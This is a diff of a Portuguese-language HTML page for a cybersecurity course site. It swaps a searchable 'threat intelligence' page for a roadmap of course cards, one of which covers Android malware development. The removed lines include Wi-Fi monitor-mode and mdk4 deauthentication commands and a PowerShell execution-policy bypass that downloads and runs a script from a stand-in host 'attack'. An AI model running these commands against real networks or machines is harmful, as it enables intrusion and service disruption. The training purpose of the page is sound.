@@ -3,88 +3,133 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CYBER SECURITY CORPORATE PLATFORM</title>
+    <title>CYBER SECURITY ACADEMY</title>
     <style>
         :root {
-            --bg-corporate: #040711;
-            --bg-surface: #0a1122;
-            --bg-terminal: #02040a;
-            --brand-blue: #1e40af;
-            --accent-cyan: #06b6d4;
-            --accent-green: #10b981;
-            --accent-red: #ef4444;
-            --text-main: #f8fafc;
-            --text-secondary: #94a3b8;
-            --border-color: rgba(255, 255, 255, 0.06);
+            --bg-main: #060913;
+            --bg-card: #0b1220;
+            --blue-glow: #1e40af;
+            --accent-blue: #00d2ff;
+            --accent-magenta: #ff007f;
+            --accent-green: #00ff66;
+            --text-title: #ffffff;
+            --text-desc: #94a3b8;
+            --border-color: rgba(255, 255, 255, 0.05);
         }
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
-        body { background-color: var(--bg-corporate); color: var(--text-main); padding: 15px; min-height: 100vh; overflow-x: hidden; font-size: 14px; }
-        .corp-header { background: var(--bg-surface); border: 1px solid var(--border-color); border-radius: 8px; padding: 20px; margin-bottom: 15px; box-shadow: 0 4px 20px rgba(0,0,0,0.5); }
-        .corp-header h1 { font-size: 1.5rem; font-weight: 800; color: #ffffff; letter-spacing: -0.5px; }
-        .corp-header h1 span { color: var(--accent-cyan); }
-        .corp-header p { font-size: 0.8rem; color: var(--text-secondary); margin-top: 4px; font-family: monospace; letter-spacing: 1px; }
-        .corp-nav { display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; margin-bottom: 15px; }
-        .nav-item { background: var(--bg-surface); border: 1px solid var(--border-color); color: #ffffff; text-align: center; padding: 12px 2px; text-decoration: none; font-size: 0.75rem; font-weight: 700; border-radius: 6px; text-transform: uppercase; transition: all 0.2s; }
-        .nav-item:hover { border-color: var(--accent-cyan); background: rgba(6, 182, 212, 0.05); }
-        .section-heading { font-size: 0.95rem; font-weight: 700; text-transform: uppercase; margin: 25px 0 12px 0; color: #ffffff; border-left: 4px solid var(--accent-cyan); padding-left: 10px; letter-spacing: 0.5px; }
-        .content-panel { background: var(--bg-surface); border: 1px solid var(--border-color); border-radius: 8px; padding: 20px; margin-bottom: 15px; box-shadow: 0 4px 12px rgba(0,0,0,0.2); }
-        p.desc-text { font-size: 0.85rem; color: var(--text-secondary); line-height: 1.6; margin-bottom: 15px; }
-        .block-title { font-size: 0.75rem; font-weight: 700; color: var(--accent-cyan); text-transform: uppercase; margin-bottom: 8px; font-family: monospace; letter-spacing: 0.5px; }
-        .terminal-block { background: var(--bg-terminal); border: 1px solid rgba(255,255,255,0.03); border-radius: 6px; padding: 12px; font-family: 'Courier New', Courier, monospace; font-size: 0.8rem; color: #cbd5e1; margin-bottom: 15px; overflow-x: auto; white-space: pre-wrap; border-left: 3px solid var(--accent-cyan); word-break: break-all; }
-        .guide-list { margin-left: 15px; margin-bottom: 15px; }
-        .guide-list li { font-size: 0.85rem; color: var(--text-secondary); margin-bottom: 6px; list-style-type: square; line-height: 1.5; }
-        .search-wrapper-real { display: flex; flex-direction: column; gap: 10px; background: var(--bg-terminal); border: 1px solid rgba(6, 182, 212, 0.2); border-radius: 6px; padding: 15px; }
-        .search-control { width: 100%; background: #040712; border: 1px solid var(--border-color); border-radius: 4px; padding: 12px; color: #ffffff; font-family: monospace; font-size: 0.9rem; outline: none; }
-        .btn-search-real { background: linear-gradient(135deg, var(--brand-blue), #1e3a8a); color: white; border: none; padding: 14px; border-radius: 4px; font-size: 0.85rem; font-weight: 700; cursor: pointer; text-transform: uppercase; font-family: monospace; transition: all 0.2s; letter-spacing: 0.5px; }
-        .btn-search-real:hover { background: #172554; }
-        .search-output-real { margin-top: 15px; padding: 15px; border-radius: 4px; font-family: monospace; font-size: 0.85rem; line-height: 1.6; display: none; overflow-x: auto; white-space: pre-wrap; word-break: break-all; }
+        
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
+        body { background-color: var(--bg-main); color: #ffffff; padding: 15px; min-height: 100vh; }
+        
+        /* CABEÇALHO ACADEMIA CHIC */
+        .academy-header { text-align: center; padding: 25px 15px; background: var(--bg-card); border: 1px solid var(--border-color); border-radius: 12px; margin-bottom: 25px; box-shadow: 0 4px 20px rgba(0,0,0,0.5); }
+        .academy-header h1 { font-size: 1.6rem; font-weight: 800; color: var(--text-title); letter-spacing: -0.5px; }
+        .academy-header h1 span { color: var(--accent-blue); }
+        .academy-header p { font-size: 0.85rem; color: var(--text-desc); margin-top: 5px; font-weight: 500; text-transform: uppercase; letter-spacing: 1px; }
+
+        /* LINHA CONECTORA DA ÁRVORE */
+        .roadmap-container { position: relative; max-width: 600px; margin: 0 auto; display: flex; flex-direction: column; gap: 20px; align-items: center; }
+        .roadmap-container::before { content: ""; position: absolute; top: 0; bottom: 0; width: 2px; background: rgba(255,255,255,0.1); z-index: 1; }
+
+        /* CARDS DO SITE DE ENSINO */
+        .course-link { text-decoration: none; display: block; width: 100%; max-width: 340px; position: relative; z-index: 2; }
+        .course-card { background: var(--bg-card); border: 1px solid var(--border-color); border-radius: 12px; padding: 20px; display: flex; flex-direction: column; align-items: center; text-align: center; transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1); box-shadow: 0 4px 15px rgba(0,0,0,0.3); }
+        
+        /* CORES DAS BORDAS IGUAL À IMAGEM */
+        .border-blue { border-top: 4px solid var(--accent-blue); }
+        .border-magenta { border-top: 4px solid var(--accent-magenta); }
+        .border-green { border-top: 4px solid var(--accent-green); }
+
+        .course-card:hover { transform: translateY(-4px); box-shadow: 0 8px 25px rgba(0,0,0,0.5); border-color: rgba(255,255,255,0.15); }
+        
+        /* CONTAINER DE ÍCONES VETORIAIS CSS */
+        .icon-box { width: 60px; height: 60px; display: flex; align-items: center; justify-content: center; font-size: 2rem; margin-bottom: 12px; background: rgba(255,255,255,0.02); border-radius: 50%; border: 1px solid rgba(255,255,255,0.05); }
+        
+        .course-card h3 { font-size: 0.95rem; font-weight: 700; color: var(--text-title); text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 6px; }
+        .course-card p { font-size: 0.75rem; color: var(--text-desc); font-weight: bold; text-transform: uppercase; letter-spacing: 0.5px; }
+
+        footer { text-align: center; padding: 25px 10px; font-size: 0.75rem; color: var(--text-desc); font-family: monospace; margin-top: 40px; border-top: 1px solid var(--border-color); }
     </style>
 </head>
 <body>
-    <header class="corp-header">
-        <h1>CYBER <span>SECURITY</span></h1>
-        <p>// CENTRAL MONOLÍTICA OPERACIONAL DE INTELIGÊNCIA CONTRA AMEAÇAS GLOBAIS</p>
+
+    <header class="academy-header">
+        <h1>PLATAFORMA <span>CYBER ACADEMY</span></h1>
+        <p>// Formação Avançada de Operadores de Segurança</p>
     </header>
-    <nav class="corp-nav">
-        <a href="offensive.html" class="nav-item">Red Team</a>
-        <a href="defensive.html" class="nav-item">Blue Team</a>
-        <a href="soc_automation.html" class="nav-item">SOC Engine</a>
-    </nav>
+
     <main>
-        <h2 class="section-heading">Mecanismo Algorítmico de Busca</h2>
-        <section class="content-panel" style="border-color: rgba(6, 182, 212, 0.3);">
-            <p class="desc-text">Insira termos como <code>termux</code>, <code>wifi</code>, <code>lazarus</code>, <code>lockbit</code> ou <code>email</code> para varrer o banco de dados.</p>
-            <div class="search-wrapper-real">
-                <input type="text" id="target-search-engine" class="search-control" placeholder="Digite uma palavra-chave tática..." required>
-                <button class="btn-search-real" onclick="executeLocalSearchScan()">Executar Varredura Estrutural</button>
-                <div id="api-search-output" class="search-output-real"></div>
-            </div>
-        </section>
-        <h2 class="section-heading">Diretórios Técnicos Fofocados em Mitigação</h2>
-        <article class="content-panel">
-            <h3>01. Inteligência de Ataque e Defesa Wireless</h3>
-            <p class="desc-text">Análise sobre interceptação de radiofrequência e captura de handshakes criptográficos.</p>
-            <div class="terminal-block">sudo airmon-ng start wlan0&#10;sudo airodump-ng wlan0mon</div>
-        </article>
+        <!-- CONSTRUÇÃO DA ÁRVORE COMPLETA DE CURSOS DO SITE (SÓ CLICAR) -->
+        <div class="roadmap-container">
+            
+            <!-- MÓDULO 01: FUNDAMENTOS (AZUL) -->
+            <a href="offensive.html" class="course-link">
+                <div class="course-card border-blue">
+                    <div class="icon-box" style="filter: drop-shadow(0 0 8px var(--accent-blue));">🔒</div>
+                    <h3>Fundamentos de Segurança e Pentest</h3>
+                    <p style="color: var(--accent-blue);">Módulo de Entrada</p>
+                </div>
+            </a>
+
+            <!-- MÓDULO 02: LINUX E SHELL (AZUL) -->
+            <a href="offensive.html" class="course-link">
+                <div class="course-card border-blue">
+                    <div class="icon-box" style="filter: drop-shadow(0 0 8px var(--accent-blue));">🐧</div>
+                    <h3>Dominando o Linux e Shell para Pentesters</h3>
+                    <p style="color: var(--accent-blue);">Infraestrutura de Terminal</p>
+                </div>
+            </a>
+
+            <!-- MÓDULO 03: RED TEAM & WIRELESS (MAGENTA) -->
+            <a href="offensive.html" class="course-link">
+                <div class="course-card border-magenta">
+                    <div class="icon-box" style="filter: drop-shadow(0 0 8px var(--accent-magenta));">📡</div>
+                    <h3>Auditoria de Redes e Ataques Wi-Fi</h3>
+                    <p style="color: var(--accent-magenta);">Módulo Ofensivo</p>
+                </div>
+            </a>
+
+            <!-- MÓDULO 04: PÓS-EXPLORAÇÃO (MAGENTA) -->
+            <a href="offensive.html" class="course-link">
+                <div class="course-card border-magenta">
+                    <div class="icon-box" style="filter: drop-shadow(0 0 8px var(--accent-magenta));">🎒</div>
+                    <h3>Pós-Exploração e Pivotamento Linux</h3>
+                    <p style="color: var(--accent-magenta);">Módulo Ofensivo</p>
+                </div>
+            </a>
+
+            <!-- MÓDULO 05: DOCKER PENTEST (MAGENTA) -->
+            <a href="soc_automation.html" class="course-link">
+                <div class="course-card border-magenta">
+                    <div class="icon-box" style="filter: drop-shadow(0 0 8px var(--accent-magenta));">🐋</div>
+                    <h3>Docker para Pentesters e Containers</h3>
+                    <p style="color: var(--accent-magenta);">Módulo de Infraestrutura</p>
+                </div>
+            </a>
+
+            <!-- MÓDULO 06: DEFESA E HARDENING (VERDE) -->
+            <a href="defensive.html" class="course-link">
+                <div class="course-card border-green">
+                    <div class="icon-box" style="filter: drop-shadow(0 0 8px var(--accent-green));">🛡️</div>
+                    <h3>Blue Team & Hardening de Servidores</h3>
+                    <p style="color: var(--accent-green);">Módulo Defensivo</p>
+                </div>
+            </a>
+
+            <!-- MÓDULO 07: MALWARE ANDROID (VERDE) -->
+            <a href="defensive.html" class="course-link">
+                <div class="course-card border-green">
+                    <div class="icon-box" style="filter: drop-shadow(0 0 8px var(--accent-green));">🤖</div>
+                    <h3>Desenvolvimento de Malwares para Android</h3>
+                    <p style="color: var(--accent-green);">Módulo Avançado Mobile</p>
+                </div>
+            </a>
+
+        </div>
     </main>
-    <script>
-        const localKnowledgeDatabase = [
-            { keys: ["termux", "android", "ssh", "bug"], title: "[TERMUX] Tratamento de Bugs de Área de Transferência", content: "A área de transferência do Termux no Android 10+ pode truncar comandos após barras (/). Contorne gerando chaves locais e injetando strings via EOF.", code: "ssh-keygen -t ed25519\ncat << 'EOF' > script.sh" },
-            { keys: ["wifi", "deauth", "mdk4", "apt28"], title: "[WI-FI] Ataques Air-Gapped e Injeção MDK4", content: "O grupo APT28 usa injeções Deauth para forçar reconexões e capturar handshakes.", code: "sudo mdk4 wlan0mon d -b alvos.txt" },
-            { keys: ["windows", "pc", "lockbit", "fileless", "email"], title: "[COMPUTADOR] Malware Fileless e Exploração via Memória RAM", content: "Sindicatos como o LockBit disparam scripts ofuscados que injetam códigos maliciosos na RAM de processos legítimos.", code: "powershell -ExecutionPolicy Bypass -Command \"IEX (New-Object Net.WebClient).DownloadString('http://attack/p.ps1')\"" }
-        ];
-        function executeLocalSearchScan() {
-            let raw = document.getElementById('target-search-engine').value.toLowerCase().trim();
-            const out = document.getElementById('api-search-output');
-            if (raw === "") { out.style.display = "block"; out.style.color = "var(--accent-red)"; out.innerHTML = "[ERRO]: Insira um termo válido."; return; }
-            if (raw.includes("@") || raw.includes("gmail") || raw.includes(".com")) { raw = "email"; }
-            out.style.display = "block"; out.style.backgroundColor = "var(--bg-terminal)"; out.style.color = "var(--text-main)"; out.style.border = "1px solid var(--accent-green)";
-            const results = localKnowledgeDatabase.filter(item => item.keys.some(k => k.includes(raw)) || item.title.toLowerCase().includes(raw) || item.content.toLowerCase().includes(raw));
-            if (results.length === 0) { out.style.color = "var(--accent-red)"; out.innerHTML = `[ZERO RESULTADOS] Nenhuma correspondência para: "${raw}". Tente 'wifi', 'termux' ou 'lockbit'.`; return; }
-            out.innerHTML = `[VARREDURA CONCLUÍDA] Mapeados ${results.length} relatórios:\n\n`;
-            results.forEach(res => { out.innerHTML += `💎 <strong>${res.title}</strong>\n${res.content}\n<span style="color: var(--accent-cyan); font-family: monospace;">${res.code}</span>\n\n`; });
-        }
-        document.getElementById('target-search-engine').addEventListener('keypress', function(e) { if (e.key === 'Enter') executeLocalSearchScan(); });
-    </script>
+
+    <footer>
+        CYBER SECURITY CORPORATE EDUCATION &copy; 2026 // AMBIENTE RESTRITO ALUNOS
+    </footer>
+
 </body>
 </html>
